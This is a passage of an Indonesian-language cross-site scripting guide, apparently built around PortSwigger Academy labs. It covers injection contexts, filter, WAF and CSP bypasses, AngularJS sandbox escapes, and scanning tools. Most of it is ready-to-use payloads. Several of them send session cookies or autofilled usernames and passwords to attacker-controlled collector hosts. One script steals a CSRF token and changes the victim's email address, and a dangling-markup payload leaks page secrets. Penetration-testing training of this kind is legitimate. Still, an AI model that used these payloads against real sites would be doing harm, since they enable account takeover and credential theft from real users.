Kuncinya: `&apos;` adalah HTML entity untuk `'`. Kalau di-store sebagai `&apos;`, server tidak menganggapnya sebagai karakter `'` jadi tidak di-escape. Browser decode `&apos;` → `'` saat render → JS melihat `'` yang menutup string.

Input di field "Website":

```text
Payload: http://foo?&apos;-alert(1)-&apos;

Hasil di HTML:
onclick="...tracker.track('http://foo?'-alert(1)-'');"
```

`&apos;` → `'` → menutup JS string → `-alert(1)-` → execute.

---

# 5.7 Canonical Link Tag Context

## 📌 Kapan Digunakan

Input muncul di atribut `href` pada canonical link tag di `<head>`:

```html
<head>
<link rel="canonical" href='INPUT'/>
</head>
```

---

## PortSwigger Lab: Reflected XSS in canonical link tag

Karena ini di `<head>`, tidak terlihat di rendered page. Angle brackets HTML-encoded. Tapi single quotes bisa dipakai untuk inject attributes:

```text
Payload: ?'accesskey='x'onclick='alert(1)

URL: https://TARGET/?'accesskey='x'onclick='alert(1)

Hasil:
<link rel="canonical" href='https://TARGET/?'accesskey='x'onclick='alert(1)'/>
```

Tag `<link>` tidak visible, tapi punya `accesskey` dan `onclick`. Untuk trigger: tekan **Alt+Shift+X** (Chrome Windows/Linux) atau **Ctrl+Alt+X** (Safari macOS).

---

# 5.8 URL / javascript: Context

## 📌 Kapan Digunakan

Input berada di atribut yang berisi URL (`href`, `src`, `action`, dll) dan tidak ada sanitization pada `javascript:` scheme.

Sudah dibahas di Section 5.3. Tambahan dan klarifikasi:

```html
<!-- jQuery href sink -->
<a href="javascript:alert(1)">link</a>
```

**Catatan `<form action>`:** `javascript:` pada atribut `action` dari `<form>` **TIDAK** mengeksekusi kode secara otomatis saat form di-submit, karena submit form tidak melakukan navigasi scheme seperti klik pada tautan `<a href>`.

Pendekatan valid untuk form context:

```html
<!-- Kombinasi dengan event handler -->
<form action="javascript:void(0)" onsubmit="alert(1)">

<!-- Atau break attribute dan inject handler -->
Payload: " onsubmit="alert(1)
```

---

# 5.9 CSS Context

## 📌 Kapan Digunakan

Saat input masuk ke CSS property atau `<style>` tag.

```html
<style>
body {
  color: INPUT;
}
</style>
```

Atau inline style attribute:

```html
<div style="color: INPUT">
```

---

## Important Distinction

**CSS injection ≠ XSS otomatis.** Modern browsers tidak menjadikan arbitrary CSS injection sebagai JavaScript execution secara langsung.

Test fokus pertama — apakah style benar-benar berubah:

```text
Input: red

Hasil:
color: red;
```

Jika CSS context dapat di-break ke HTML (aplikasi menyuntikkan CSS ke dalam `<style>` yang sudah ada di halaman), dampaknya bergantung pada bagaimana CSS dimasukkan ke DOM.

---

## Kapan CSS Injection Bisa Menjadi XSS

1. **Jika input di `<style>` tag dan angle brackets tidak di-encode** → bisa close `</style>` dan inject HTML:
    
    ```text
    Payload: red}</style><img src=1 onerror=alert(1)>
    ```
    
2. **Jika input di `style` attribute dan bisa break ke HTML attribute** → inject event handler setelah menutup `style`:
    
    ```text
    Payload: color:red" onmouseover="alert(1)
    ```
    
3. **Jika input hanya ke CSS property dan angle brackets di-encode** → catat sebagai CSS injection informatif, bukan XSS.
    

---

# 5.10 JSON Context

## 📌 Kapan Digunakan

Saat input menjadi bagian JSON/API response atau JavaScript-generated JSON.

```javascript
const data = {"name":"INPUT"};
```

---

## Vulnerable Flow

```text
User Input
│
▼
JSON
│
▼
JavaScript parser
│
▼
DOM sink (innerHTML / document.write / eval)
│
▼
XSS
```

JSON encoding yang benar **tidak otomatis** menghasilkan XSS:

```json
{
  "name": "<script>alert(1)</script>"
}
```

XSS muncul **hanya jika** nilai tersebut kemudian masuk ke dangerous sink:

```javascript
element.innerHTML = data.name;
```

---

## Cara Test JSON Context

```text
1. Kirim marker ke API endpoint:
   POST /api/profile
   Content-Type: application/json
   {"name":"xss1234"}

2. Cari di mana response di-render:
   - Apakah masuk ke DOM via innerHTML?
   - Apakah di-eval?
   - Apakah dimasukkan ke document.write?

3. Trace path JSON value → DOM sink di browser DevTools

4. Kalau sink ditemukan, gunakan payload sesuai sink:
   - innerHTML sink → <img src=1 onerror=alert(1)>
   - eval sink → alert(1)
```

---

## JSON Escape Bypass

Jika ada JSON string encoding tapi backslash tidak di-escape (seperti Lab DOM XSS Reflected):

```text
Input: \"-alert(1)}//

Hasil JSON yang dikirim server:
{"searchTerm":"\\"-alert(1)}//"}

Dalam eval:
- \\ = literal \
- " = menutup string
- -alert(1) = JS expression
```

Lihat Section 3.4 (Reflected DOM XSS Lab) untuk detail.

---

# 5.11 AngularJS Expression (CSTI)

## 📌 Kapan Digunakan

Halaman menggunakan AngularJS (`ng-app` attribute atau Angular framework). Angle brackets dan double quotes HTML-encoded. Tapi AngularJS mengevaluasi ekspresi `{{ }}`.

---

## Deteksi AngularJS

```html
<html ng-app>
<!-- atau -->
<div ng-app="myApp">
<script src="angular.js"></script>
```

---

## PortSwigger Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Proof of concept (basic CSTI):

```text
Payload: {{7*7}}

Kalau response menampilkan "49" → AngularJS CSTI confirmed
```

XSS payload:

```text
Payload: {{$on.constructor('alert(1)')()}}
```

Penjelasan:

- `$on` adalah AngularJS internal function
- `.constructor` adalah Function constructor
- `('alert(1)')` → membuat function dengan isi `alert(1)`
- `()` → memanggil function tersebut

Alternatif:

```text
{{constructor.constructor('alert(1)')()}}
```

---

## Cookie Theft via CSTI

```text
{{constructor.constructor("fetch('http://ATTACKER:8000/?c='+document.cookie)")()}}
```

Berguna saat XSS confirm via AngularJS dan perlu membuktikan impact tanpa `alert`.

---

## Context Master Table

|Context|Contoh Vulnerable|First Test|Typical PoC|
|---|---|---|---|
|HTML body|`<div>INPUT</div>`|marker + tag|`<script>alert(1)</script>`|
|Attribute|`<input value="INPUT">`|break `"`|`" onmouseover="alert(1)`|
|JS `'...'`|`var x='INPUT'`|break `'`|`'-alert(1)-'`|
|JS `"..."`|`var x="INPUT"`|break `"`|`"-alert(1)-"`|
|Template literal|`` var x=`INPUT` ``|interpolation|`${alert(1)}`|
|href|`<a href="INPUT">`|inspect scheme|`javascript:alert(1)`|
|onclick HTML entity|`onclick="goto('INPUT')"`|`&apos;` trick|`http://foo?&apos;-alert(1)-&apos;`|
|CSS|`color: INPUT`|style change|context-dependent (close style, inject tag)|
|JSON|`{"x":"INPUT"}`|trace parser/sink|sink-dependent|
|DOM|`innerHTML=source`|trace source|`<img src=1 onerror=alert(1)>`|
|AngularJS|`<div>{{INPUT}}</div>`|`{{7*7}}`|`{{constructor.constructor('alert(1)')()}}`|

---

# 🧬 6. Filter Bypass Techniques

> **Prinsip:** Jangan menebak bypass. Identifikasi dulu **apa yang diblok**, kemudian baru mutate secara sistematis.

---

# 6.1 Tag Fuzzing dengan Burp Intruder

## 📌 Kapan Digunakan

WAF atau aplikasi memblok tag tertentu. Perlu identifikasi tag mana yang lolos.

**PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked**

---

## Cara Fuzzing Tag dengan Burp Intruder

```text
Langkah 1:
Di Burp Repeater, kirim request dengan payload test:
GET /search?q=<script>alert(1)</script> HTTP/2

Kalau 400/blocked → tags difilter.

Langkah 2:
Send to Intruder

Langkah 3:
Di Intruder, ubah payload:
GET /search?q=<§tag§> HTTP/2
(§ adalah injection point marker)

Positions: Sniper, injection point di antara < dan >

Langkah 4:
Payloads tab:
- Payload type: Simple list
- Paste semua tag dari PortSwigger XSS cheat sheet:
  https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Langkah 5:
Start attack

Langkah 6:
Sort by Length atau Status code
- Status 200 = mungkin allowed
- Status 400 = blocked
- Response length berbeda = tag diproses berbeda
```

---

## Identifikasi Allowed Tag

Setelah tahu tag yang lolos (misal: `<body>`), fuzz event handler-nya (Section 6.2).

---

# 6.2 Attribute Fuzzing dengan Burp Intruder

## Setelah tag ditemukan, fuzz attribute/event handler

```text
Langkah 1:
Di Intruder, ubah payload:
GET /search?q=<body §event§=alert(1)> HTTP/2

Injection point di nama event.

Langkah 2:
Payload list: semua event handler dari XSS cheat sheet:
onload
onerror
onmouseover
onfocus
onclick
onblur
onresize
onscroll
...

Langkah 3:
Start attack → cari yang response berbeda (200/diizinkan)
```

---

## Contoh Hasil Bypass

Kalau tag `<body>` dan event `onresize` allowed:

```html
<body onresize="print()">
```

Tapi tidak bisa langsung trigger `onresize` secara otomatis. Deliver via iframe:

```html
<!-- Di exploit server -->
<iframe src="https://TARGET/?q=<body onresize=print()>" onload="this.style.width='100px'">
```

---

# 6.3 Custom Tag Bypass

## PortSwigger Lab: Reflected XSS into HTML context with all tags blocked except custom ones

Semua standard HTML tag diblok kecuali custom tags. Custom tag dengan `tabindex` + `onfocus` + `id` = auto-trigger dengan URL fragment:

```text
Payload:
<xss id=x onfocus=alert(1) tabindex=1>

URL:
https://TARGET/?q=<xss id=x onfocus=alert(1) tabindex=1>#x
```

`#x` di URL → browser auto-focus ke element dengan `id="x"` → `onfocus` trigger.

Delivery ke victim (di exploit server):

```html
<script>
document.location = 'https://TARGET/?q=<xss id=x onfocus=alert(1) tabindex=1>#x'
</script>
```

---

# 6.4 SVG Markup Bypass

## PortSwigger Lab: Reflected XSS with some SVG markup allowed

Fuzz dulu tag dan event yang diizinkan. Hasil: `<svg>`, `<animatetransform>` allowed, event `onbegin` allowed.

```html
<svg><animatetransform onbegin=alert(1)>
```

`<animatetransform>` adalah SVG animation element. Event `onbegin` fire saat animation dimulai (langsung saat render).

Variasi SVG lain yang sering lolos:

```html
<svg onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

---

# 6.5 Keyword Filter Bypass

## `alert` difilter?

```javascript
// Pakai confirm atau prompt
<img src=1 onerror=confirm(1)>
<img src=1 onerror=prompt(1)>

// Pakai eval dengan encoding
<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>
// atob('YWxlcnQoMSk=') = 'alert(1)'

// String konstruksi
<img src=1 onerror=window['ale'+'rt'](1)>

// Template literal
<script>window[`al`+`ert`](1)</script>
```

## `onerror` / `onload` difilter?

```html
<img src=1 onerror=alert(1)>        → blok
<body onresize=alert(1)>            → coba
<body onpageshow=alert(1)>          → coba
<svg onload=alert(1)>               → coba
<details ontoggle=alert(1) open>    → coba
<marquee onstart=alert(1)>          → coba (deprecated tapi kadang lolos)
<input onfocus=alert(1) autofocus>  → coba
```

---

# 6.6 Quote Filter Bypass

Kalau `'` dan `"` diblok di HTML attribute:

```html
<!-- Tanpa quotes di attribute -->
<img src=1 onerror=alert(1)>         ← sudah tanpa quote
<svg onload=alert(1)>                ← sudah tanpa quote
```

Kalau dalam JS string dan semua quote diblok:

```javascript
// Pakai String.fromCharCode
<script>alert(String.fromCharCode(88,83,83))</script>

// Pakai template literal (backtick)
<script>alert`1`</script>

// Pakai eval dengan base64
<script>eval(atob('YWxlcnQoMSk='))</script>
```

---

# 6.7 Space Filter Bypass

## 📌 Kapan Digunakan

Saat whitespace diblok atau di-strip pada attribute boundaries.

## Alternatif Whitespace

```html
<!-- Tab character -->
<img	src=1	onerror=alert(1)>

<!-- Newline -->
<svg
onload=alert(1)>

<!-- Forward slash sebagai separator (HTML spec) -->
<img/src=1/onerror=alert(1)>

<!-- Comments sebagai whitespace dalam atribut -->
<img/**/src=1/**/onerror=alert(1)>
```

Contoh penggunaan di URL parameter:

```text
Payload: <img%09src=1%09onerror=alert(1)>
(tab URL-encoded = %09)
```

---

# 6.8 Bracket Filter Bypass

## 📌 Kapan Digunakan

Saat `(` dan `)` difilter, sehingga `alert(1)` tidak bisa dipakai langsung.

## Backtick Call (Tagged Template Literal)

```javascript
alert`1`
```

Backtick memanggil `alert` sebagai tagged template function dengan argument `["1"]`.

## throw/onerror Trick

```javascript
javascript:throw onerror=alert,1337
```

- `throw` melontarkan exception
- `onerror=alert` set global error handler ke `alert`
- `1337` adalah value yang di-throw → `alert(1337)` terpanggil

## Method Reference

```javascript
window.alert.call(null,1)
```

Validitas bergantung pada context dan apakah `.` dan `,` juga difilter. Lihat Section 9.7 untuk context spesifik PortSwigger lab.

---

# 6.9 WAF Bypass Approach

## Systematic Approach

```text
1. Identify baseline — payload standar seperti apa responsenya?
2. Isolate — bagian mana yang diblok? Tag? Attribute? Keyword?
3. Fuzz — gunakan Burp Intruder untuk fuzz per komponen
4. Mutate — ubah case, spasi, encoding
5. Verify — konfirmasi di browser, bukan hanya Repeater
```

## Case Variation

```html
<sCrIpT>alert(1)</sCrIpT>
<SCRIPT>alert(1)</SCRIPT>
<ScRiPt>alert(1)</ScRiPt>
```

## Encoding

```html
<!-- HTML entity dalam attribute -->
<img src=1 onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<!-- &#97;&#108;... = alert(1) -->

<!-- URL encoding dalam URL parameter -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Double encoding (hanya berguna jika ada multiple decoding stage) -->
%253Cscript%253E
```

## Filter Identification Script

Sebelum fuzz random, identifikasi dulu karakter mana yang lolos:

```bash
for c in '<' '>' '"' "'" '/' 'script' 'alert' 'onerror' 'onload'; do
  r=$(curl -s --get --data-urlencode "q=TEST${c}TEST" "http://TARGET/search" | grep -o "TEST${c}TEST" | head -1)
  [ -n "$r" ] && echo "[PASS] $c" || echo "[BLOCK] $c"
done
```

Output menunjukkan persis apa yang perlu di-bypass.

---

# 6.10 Polyglot XSS

## 📌 Kapan Digunakan

Saat context injeksi belum diketahui secara pasti, atau ingin menguji satu payload universal di multiple context sekaligus.

## Contoh Basic (HTML body, atribut, comment block)

```javascript
'"><img src=x onerror=alert(1)>
```

## Contoh Kompleks (Multi-Context)

Bekerja di script tag, style tag, textarea, title, tag attribute, HTML body:

```javascript
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=alert(1)//
```

## Kapan Polyglot TIDAK Disarankan

- **Context sudah teridentifikasi** → payload spesifik jauh lebih efektif. `" onfocus="alert(1)` lebih bersih dari polyglot jika input ada di `<input value="...">`.
- **WAF/IDS aktif** → polyglot sangat panjang dan memuat banyak signature karakter berbahaya, mudah memicu rule WAF.
- **Learning/CTF** → analisis context lebih dulu untuk bangun muscle memory. Polyglot membuat kebiasaan buruk.

---

# 🍪 7. XSS to Cookie Theft

# 7.1 Setup Receiver

## Burp Collaborator (Recommended untuk Labs)

```text
1. Burp Suite → Burp Collaborator
2. "Copy to clipboard"
→ Dapat: abc123xyz.oastify.com

3. Pakai URL ini di payload:
   fetch('https://abc123xyz.oastify.com/?c='+document.cookie)

4. Setelah XSS trigger → Collaborator → "Poll now"
5. Lihat incoming request dengan cookie
```

## Exploit Server PortSwigger (Untuk Labs)

PortSwigger labs menyediakan exploit server. Pakai URL-nya sebagai callback:

```text
https://exploit-abc123.exploit-server.net/log?cookie=...
```

## Python HTTP Server (Local Lab / Fallback)

```bash
python3 -m http.server 8000
```

Callback URL: `http://ATTACKER-IP:8000/`

> Catatan: untuk PortSwigger labs, pakai exploit server atau Collaborator — python server tidak reachable dari cloud labs.

---

# 7.2 XSS Payload Cookie Theft

**PortSwigger Lab: Exploiting cross-site scripting to steal cookies**

Stored XSS di komentar blog. Admin melihat komentar. Steal cookie admin.

Payload di field komentar:

```html
<script>
fetch('https://BURP-COLLABORATOR-URL/?cookie='+encodeURIComponent(document.cookie))
</script>
```

Atau menggunakan redirect:

```html
<script>
document.location='https://BURP-COLLABORATOR-URL/?cookie='+document.cookie
</script>
```

Atau via image tag (lebih stealth, bypass beberapa CSP):

```html
<script>
new Image().src='https://BURP-COLLABORATOR-URL/?c='+document.cookie
</script>
```

---

## Flow Lengkap di Lab

```text
1. Buka Burp Collaborator → Copy URL
2. Isi komentar di blog post:
   <script>
   fetch('https://COLLABORATOR/?c='+encodeURIComponent(document.cookie))
   </script>

3. Submit komentar

4. Admin bot akan membuka page (otomatis di lab)

5. Burp Collaborator → Poll now
   → Lihat:
   GET /?c=session%3Dadmin-session-token HTTP/1.1

6. Decode: session=admin-session-token

7. Di browser: DevTools → Application → Cookies
   → Ubah session cookie jadi admin-session-token

8. Refresh → Login sebagai admin
```

---

# 7.3 Apa yang Dilakukan dengan Cookie

```text
Stolen cookie: session=abc123xyz

Options:
├── Buka browser
├── DevTools → Application → Cookies
├── Edit / Add cookie: session=abc123xyz
├── Refresh halaman
└── Jika valid: logged in sebagai victim
```

Limitations:

- `HttpOnly=true` → `document.cookie` tidak bisa baca cookie tersebut
- `SameSite=Strict` → cookie tidak dikirim di cross-site request
- Session bound to IP/UserAgent → cookie mungkin tidak valid di browser lain

---

## Cross-Service Correlation

Setelah XSS berhasil dan dapat credentials/session:

```text
XSS → Cookie/Credential Stolen
│
├──→ Coba ke /admin → privilege escalation
├──→ Coba credential ke SSH (port 22)
├──→ Coba privilege escalation di web app
└──→ XSS + fetch ke internal host → SSRF via victim browser
     (→ [🌐 22 — SSRF Workflow](/docs/ssrf))
```

---

# 🔑 8. XSS to Password Capture & CSRF Bypass

# 8.1 XSS to Capture Passwords

**PortSwigger Lab: Exploiting XSS to capture passwords**

Browser modern sering auto-fill password ketika menemukan form login. Inject form palsu via Stored XSS:

```html
<input name=username id=username>
<input type=password name=password onchange="
var u=document.getElementById('username').value;
fetch('https://BURP-COLLABORATOR-URL/?user='+encodeURIComponent(u)+'&pass='+encodeURIComponent(this.value))
">
```

Flow:

```text
1. Inject payload di comment/profile
2. Admin/victim buka page
3. Browser auto-fill credentials di form palsu
4. `onchange` trigger saat password field terisi
5. Credentials dikirim ke Collaborator
6. Check Collaborator → dapat username + password
```

---

# 8.2 XSS to Bypass CSRF Defenses

**PortSwigger Lab: Exploiting XSS to bypass CSRF defenses**

XSS berjalan dalam origin aplikasi → bisa baca CSRF token dari DOM → bisa lakukan authenticated request.

Flow:

```text
1. XSS execute di browser victim
2. Fetch halaman yang berisi CSRF token
3. Extract CSRF token dari response
4. Buat request dengan token yang dicuri
5. Kirim request berbahaya (misal: ganti email)
```

Payload (fetch API):

```html
<script>
fetch('/my-account')
  .then(r => r.text())
  .then(html => {
    var token = html.match(/name="csrf" value="(\w+)"/)[1];
    return fetch('/my-account/change-email', {
      method: 'POST',
      body: 'csrf='+token+'&email=attacker@evil.com',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'}
    });
  });
</script>
```

---

# 8.3 HttpOnly Cookie — Batas dan Alternatif

```text
Cookie: session=abc; HttpOnly

document.cookie → kosong untuk cookie ini
```

`HttpOnly` mencegah JavaScript membaca cookie. Tapi XSS masih berbahaya:

```text
Alternatif impact dengan HttpOnly:

├── CSRF via XSS (cookie otomatis disertakan browser)
├── Baca/modifikasi data sensitif di DOM
├── Capture credentials dari form (Section 8.1)
├── Redirect ke phishing page
├── Keylogging
└── Screenshot via canvas API
```

---

# 🛡️ 9. CSP Bypass

# 9.1 Apa Itu CSP

**Content Security Policy (CSP)** adalah HTTP header yang membatasi resource apa yang boleh di-load dan dieksekusi browser.

```text
Content-Security-Policy: script-src 'self'; object-src 'none';
```

CSP bisa mencegah XSS eksekusi. Tapi banyak misconfiguration yang bisa di-bypass.

---

# 9.2 Cara Detect CSP

Di Burp Suite: cek response headers setelah intercept request.

```text
Burp Proxy → HTTP History → klik response → Headers tab

Cari:
Content-Security-Policy: ...
```

Atau via curl untuk simple header check:

```bash
curl -sI https://TARGET/ | grep -i content-security-policy
```

Paste hasil ke **CSP Evaluator**: https://csp-evaluator.withgoogle.com/

---

# 9.3 Common CSP Misconfigurations

|CSP Rule|Masalah|Bypass Idea|
|---|---|---|
|`script-src 'unsafe-inline'`|Inline script allowed|Langsung inject `<script>`|
|`script-src 'unsafe-eval'`|eval() dan variannya allowed|Lihat note di bawah|
|`script-src *.trusted.com`|Wildcard domain|Cari subdomain yang kontrollable|
|`script-src cdn.example.com`|CDN whitelisted|Cari JSONP endpoint di CDN tersebut|
|`script-src 'nonce-xxx'`|Nonce-based|Cari nonce yang bocor / reused|
|`report-uri` yang reflect input|Header injection|Inject directive baru|
|Tidak ada CSP|Tidak ada proteksi|Semua payload bekerja|

---

## Catatan Kritis `unsafe-eval`

`'unsafe-eval'` tidak hanya mengizinkan `eval()`. Direktif ini membuka **seluruh primitif evaluasi string JavaScript**, termasuk:

```javascript
eval(string)
Function(string)()
setTimeout("string", delay)    // string form, bukan function
setInterval("string", delay)   // string form
window.execScript(string)      // legacy IE
```

Jika CSP mengaktifkan `'unsafe-eval'`, injeksi yang diblok dari inline `<script>` **dapat dieksekusi secara dinamis** melalui vektor evaluasi string di atas, asalkan ada script trusted yang meneruskan user input ke fungsi-fungsi tersebut.

---

# 9.4 CSP Bypass Techniques

## Bypass via JSONP

Kalau CSP whitelist domain yang punya JSONP endpoint:

```text
CSP: script-src https://accounts.google.com

JSONP endpoint:
https://accounts.google.com/o/oauth2/revoke?token=alert(1337)

Inject:
<script src="https://accounts.google.com/o/oauth2/revoke?token=alert(1337)"></script>
```

## Bypass via Open Redirect ke Whitelisted Domain

```text
CSP: script-src https://cdn.example.com

Open redirect di cdn.example.com:
https://cdn.example.com/redirect?url=https://attacker.com/evil.js

Inject:
<script src="https://cdn.example.com/redirect?url=https://attacker.com/evil.js"></script>
```

## Bypass via Nonce Leak

Kalau nonce ada di DOM (misal di attribute yang tidak eksekusi script):

```html
<script nonce="abc123">
// legitimate script
</script>

<!-- Attacker inject: -->
<script nonce="abc123">alert(1)</script>
```

---

# 9.5 AngularJS Sandbox Escape

## Konsep

AngularJS menjalankan ekspresi `{{ }}` di sandboxed scope. Sandbox mencegah akses ke `window`, `document`, dan constructor chain. Tapi sandbox ini bisa di-escape.

---

## PortSwigger Lab: Reflected XSS with AngularJS sandbox escape without strings

Filter memblok karakter string (`'` dan `"`). Harus escape sandbox tanpa menggunakan string literals.

Teknik: override `charAt` method AngularJS menggunakan `[].join`, lalu gunakan `fromCharCode` untuk construct string tanpa quote:

```text
Payload:
?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

Penjelasan:

- `toString().constructor.prototype.charAt=[].join` → override charAt agar selalu return empty string, memungkinkan AngularJS melewati whitelist check
- `fromCharCode(120,61,97,108,101,114,116,40,49,41)` = `x=alert(1)`
- `orderBy` filter evaluate expression tersebut
- `=1` di akhir assign ke left-hand side

---

## PortSwigger Lab: Reflected XSS with AngularJS sandbox escape and CSP

CSP memblok inline script. AngularJS sandbox juga aktif.

```text
Payload:
?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>

Delivery via exploit server:
<script>
document.location='https://TARGET/?search=<input id=x ng-focus=$event.composedPath()|orderBy:\'(z=alert)(1)\'>#x'
</script>
```

`#x` auto-focus ke element → `ng-focus` trigger → AngularJS evaluate expression di attribute.

---

# 9.6 Event Handlers & href Attributes Blocked

## PortSwigger Lab: Reflected XSS with event handlers and href attributes blocked

Semua event handler (`onerror`, `onload`, `onmouseover`, dll) diblok. `href=javascript:` juga diblok.

Teknik: gunakan SVG `<animate>` untuk set `href` attribute ke `javascript:` nilai:

```html
<svg>
  <a>
    <animate attributeName=href values=javascript:alert(1) />
    <text y=20>Click me</text>
  </a>
</svg>
```

`<animate>` set `href` dari `<a>` ke `javascript:alert(1)` setelah render. Klik text → execute.

---

# 9.7 JavaScript URL dengan Karakter yang Diblok

## PortSwigger Lab: Reflected XSS in a JavaScript URL with some characters blocked

XSS ada di dalam `javascript:` URL context (href attribute). Tapi tanda kurung `(` dan `)` diblok.

Bypass tanpa tanda kurung menggunakan `throw`:

```javascript
javascript:throw onerror=alert,1337
```

Variasi via eval dengan template literal:

```javascript
javascript:eval`alert(1337)`
```

Atau teknik spesifik lab PortSwigger yang inject ke JSON context:

```text
https://TARGET/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

---

# 9.8 Dangling Markup Attack

## PortSwigger Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

CSP sangat ketat → tidak bisa execute script sama sekali. Tapi masih bisa exfiltrate data (misal CSRF token) via dangling markup.

**Konsep Dangling Markup:**

```text
Inject tag yang tidak tertutup di mana data sensitif ada di bawahnya.
Tag tersebut "menelan" konten HTML termasuk sensitive data,
dan mengirimkannya ke attacker server melalui HTTP request.
```

Contoh injection:

```html
<img src='https://ATTACKER/?data=
```

Tag `<img src='...` tidak ditutup. Browser meneruskan membaca HTML hingga menemukan tanda kutip penutup `'` yang berikutnya. Semua konten di antaranya menjadi nilai `src`, termasuk CSRF token yang ada di bawah injection point.

```text
Halaman HTML setelah injection:

...
<div>
<img src='https://ATTACKER/?data=

...
<form>
<input name="csrf" value="SECRET_TOKEN_HERE">  ← masuk ke src!
...
</form>
...
<img src='/...'>  ← kutip pertama yang ditemukan = penutup src
```

Browser request: `https://ATTACKER/?data=%0A...SECRET_TOKEN_HERE...`

---

# 9.9 CSP Bypass via Header Injection

## PortSwigger Lab: Reflected XSS protected by CSP, with CSP bypass

CSP header mengandung nilai yang bisa di-inject. Misalnya `report-uri` parameter yang me-reflect input:

```text
CSP awal:
Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=abc

Inject:
token=abc;script-src-attr 'unsafe-inline'

Hasil CSP header:
Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=abc;script-src-attr 'unsafe-inline'
```

Di beberapa browser (khususnya Chrome), `script-src-attr 'unsafe-inline'` mengizinkan inline event handlers meskipun ada `script-src 'self'`.

Cara deliver:

```text
https://TARGET/?search=<img src=1 onerror=alert(1)>&token=;script-src-attr 'unsafe-inline'
```

---

# 🧰 10. Tools & Automation

# 10.1 Burp Suite untuk XSS (PRIMARY)

## Setup

```text
1. Buka Burp Suite Community/Pro
2. Proxy → Options → Proxy Listener: 127.0.0.1:8080
3. Proxy → Open Browser (Burp's browser)
   ATAU configure manual proxy di Firefox:
   about:preferences → Network Settings → Manual proxy
   HTTP Proxy: 127.0.0.1, Port: 8080
```

---

## Proxy — Intercept & Forward

```text
Intercept is ON:
- Tangkap setiap request
- Bisa modifikasi sebelum dikirim
- Forward untuk lanjutkan

Intercept is OFF:
- Request otomatis diteruskan
- Cukup cek HTTP History
```

---

## Repeater — Core Testing Tool

Workflow:

```text
1. HTTP History → klik kanan request → Send to Repeater
2. Repeater tab
3. Ubah parameter di Request panel
4. Klik Send
5. Lihat Response panel:
   - Response tab: raw HTML
   - Render tab: visual preview
   - Ctrl+F: cari payload di response
6. Iterasi — ubah payload, Send lagi
```

Testing context di Repeater:

```text
Step 1: q=xss1234           → cari marker di response
Step 2: q=<script>test      → lihat apakah diblok/encoded
Step 3: q="                 → lihat apakah quote break attribute
Step 4: q=<img src=1 onerror=alert(1)>  → test payload
Step 5: Kalau Render tab menampilkan sesuatu = payload reflected
        Kalau alert muncul di browser = XSS
```

---

## Intruder — Fuzzing Tags/Attributes

```text
1. Repeater → klik kanan → Send to Intruder
2. Positions tab:
   - Clear § (hapus semua marker auto)
   - Select bagian yang mau di-fuzz → Add §
   Contoh: q=<§xss§> → akan fuzz tag name

3. Payloads tab:
   - Payload type: Simple list
   - Load atau Paste list (dari PortSwigger XSS cheat sheet)

4. Start attack

5. Sort hasil by:
   - Status code (200 vs 400)
   - Response length (berbeda = different response = tag diproses berbeda)
```

---

## Collaborator — Blind XSS

```text
1. Burp → Burp Collaborator
2. "Copy to clipboard" → dapat unique domain
   contoh: 0abc123def.oastify.com

3. Pakai di payload:
   <script>
   fetch('https://0abc123def.oastify.com/?c='+document.cookie)
   </script>

4. Setelah XSS trigger di victim browser → Poll now
5. Lihat HTTP interactions di panel bawah
```

---

# 10.2 Browser DevTools untuk XSS

## DOM XSS Testing

```text
F12 → Console:
Langsung test sink:
document.querySelector('#output').innerHTML = '<img src=1 onerror=alert(1)>'

Jika alert muncul → sink executable
```

## Source Search

```text
F12 → Sources → Ctrl+Shift+F

Cari:
innerHTML
document.write
eval(
location.hash
location.search
jQuery(
$(
.html(
```

## DOM Audit Cepat

```text
F12 → Console:
// Monitor DOM changes
var observer = new MutationObserver(console.log);
observer.observe(document.body, {childList:true, subtree:true});
```

---

# 10.3 Dalfox — XSS Scanner

```bash
# Install
go install github.com/hahwul/dalfox/v2@latest
export PATH="$PATH:$(go env GOPATH)/bin"

# Basic scan
dalfox url "https://TARGET/search?q=test"

# Dengan blind XSS (pakai Collaborator URL)
dalfox url "https://TARGET/search?q=test" \
  --blind "https://COLLABORATOR-URL/dalfox"

# Scan dengan cookie (authenticated)
dalfox url "https://TARGET/search?q=test" \
  --cookie "session=YOUR-SESSION-COOKIE"

# POST parameter
dalfox url "https://TARGET/comment" \
  --method POST \
  --data "comment=test&postId=1"
```

> **Catatan:** Dalfox bagus untuk initial scan tapi sering miss DOM XSS dan complex context. Selalu verifikasi manual di browser. Scanner result ≠ confirmed XSS.

---

# 10.4 XSStrike

```bash
# Clone dan setup dengan virtual environment (Parrot OS)
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Basic scan
python3 xsstrike.py -u "https://TARGET/search?q=test"

# DOM mode
python3 xsstrike.py -u "https://TARGET/page" --dom

# POST
python3 xsstrike.py -u "https://TARGET/search" \
  --data "q=test"
```

---

# 10.5 curl — Simple Output Check

Gunakan curl hanya untuk:

**Cek response headers (CSP, Set-Cookie):**

```bash
curl -sI https://TARGET/ | grep -iE '(content-security-policy|set-cookie|server|x-powered-by)'
```

**Cek apakah input direfleksikan (sanity check awal):**

```bash
curl -s "https://TARGET/search?q=xss1234" | grep -c "xss1234"
```

**Filter character test:**

```bash
for c in '<' '>' '"' "'" '/' 'script' 'alert' 'onerror'; do
  r=$(curl -s "https://TARGET/search?q=TEST${c}TEST" | grep -o "TEST${c}TEST")
  [ -n "$r" ] && echo "[PASS] $c" || echo "[BLOCK] $c"
done
```

